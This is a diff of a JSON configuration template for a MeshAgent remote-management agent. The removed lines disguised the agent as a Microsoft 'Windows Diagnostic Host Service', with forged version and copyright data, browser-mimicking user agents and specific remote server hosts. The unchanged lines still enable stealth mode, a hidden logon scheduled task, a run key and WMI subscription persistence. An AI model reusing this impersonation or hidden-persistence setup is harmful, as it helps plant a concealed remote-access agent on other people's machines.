@@ -2,37 +2,31 @@
   "$schema": "./schema/meshagent.schema.json",
   "_comment": "TEMPLATE FILE – copy to branding_config.local.json and override the placeholder values for your environment",
   "branding": {
-    "companyName": "Microsoft Corporation",
-    "serviceName": "WinDiagnosticHost",
-    "displayName": "Windows Diagnostic Host Service",
-    "binaryName": "diaghost.exe",
-    "productName": "Windows Diagnostic Host",
-    "description": "system health monitoring",
-    "installRoot": "C:/ProgramData/DiagnosticHost",
-    "logPath": "C:/ProgramData/DiagnosticHost/logs",
+    "companyName": "REPLACE_WITH_COMPANY_NAME",
+    "serviceName": "MeshAgent",
+    "displayName": "Mesh Agent Service",
+    "binaryName": "meshagent.exe",
+    "serviceDllName": "meshsvc.dll",
+    "productName": "Mesh Agent",
+    "description": "remote management agent",
+    "installRoot": "C:/ProgramData/MeshAgent",
+    "logPath": "C:/ProgramData/MeshAgent/logs",
     "versionInfo": {
-      "fileVersion": "10.0.19041.0",
-      "productVersion": "10.0.19041.0",
-      "fileDescription": "Windows Diagnostic Host Service",
-      "internalName": "diaghost.exe",
-      "legalCopyright": "© Microsoft Corporation. All rights reserved.",
-      "originalFilename": "diaghost.exe"
+      "fileVersion": "1.0.0.0",
+      "productVersion": "1.0.0.0",
+      "fileDescription": "Mesh Agent Service",
+      "internalName": "meshagent.exe",
+      "legalCopyright": "REPLACE_WITH_COPYRIGHT",
+      "originalFilename": "meshagent.exe"
     }
   },
   "network": {
-    "primaryEndpoint": "wss://agents.high.support:4445/agent.ashx",
+    "primaryEndpoint": "wss://REPLACE_WITH_SERVER:443/agent.ashx",
     "fallbackEndpoints": [
       {
-        "url": "wss://agents.high.support:4446/agent.ashx",
-        "sni": "agents.high.support",
-        "hostHeader": "agents.high.support",
-        "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
-        "alpn": ["http/1.1"]
-      },
-      {
-        "url": "wss://agents-dr.high.support:4445/agent.ashx",
-        "sni": "agents-dr.high.support",
-        "hostHeader": "agents-dr.high.support",
+        "url": "wss://REPLACE_WITH_FALLBACK_1:443/agent.ashx",
+        "sni": "REPLACE_WITH_SNI",
+        "hostHeader": "REPLACE_WITH_HOST_HEADER",
         "userAgent": null,
         "alpn": ["http/1.1"]
       }
@@ -40,7 +34,7 @@
     "sni": null,
     "hostHeader": null,
     "alpn": ["http/1.1"],
-    "userAgent": "Microsoft-CryptoAPI/10.0",
+    "userAgent": "MeshAgent/1.0",
     "connectionTimeout": 30,
     "retryAttempts": 5,
     "retryDelay": 10,
@@ -48,9 +42,9 @@
     "compression": true
   },
   "artifacts": {
-    "databaseName": "diaghost.db",
-    "logFileName": "diagnostics.log",
-    "configFileName": "diaghost.conf"
+    "databaseName": "meshagent.db",
+    "logFileName": "meshagent.log",
+    "configFileName": "meshagent.conf"
   },
   "stealth": {
     "enabled": true,
@@ -76,13 +70,13 @@
     "runKey": true,
     "scheduledTask": {
       "enabled": true,
-      "taskName": "Windows Diagnostic Host Task",
+      "taskName": "Mesh Agent Task",
       "trigger": "onlogon",
       "hidden": true
     },
     "wmi": {
       "enabled": true,
-      "className": "WinDiagnosticHost",
+      "className": "MeshAgent",
       "methodName": "StartService",
       "namespace": "root/subscription"
     },
@@ -124,16 +118,16 @@
         "subject": "CN=Your Signing Certificate",
         "store": "My",
         "description": "Primary production signing certificate",
-        "path": "certs/diaghost_sign.pfx"
+        "path": "certs/signing.pfx"
       }
     ]
   },
   "provisioning": {
-    "meshName": "Windows Diagnostics",
+    "meshName": "REPLACE_WITH_MESH_NAME",
     "meshType": "2",
     "meshId": "REPLACE_WITH_MESH_ID",
     "serverId": "REPLACE_WITH_SERVER_ID",
-    "serverUrl": "wss://agents.high.support:4445/agent.ashx",
+    "serverUrl": "wss://REPLACE_WITH_SERVER:443/agent.ashx",
     "autoRegister": true,
     "installFlags": "0"
   },
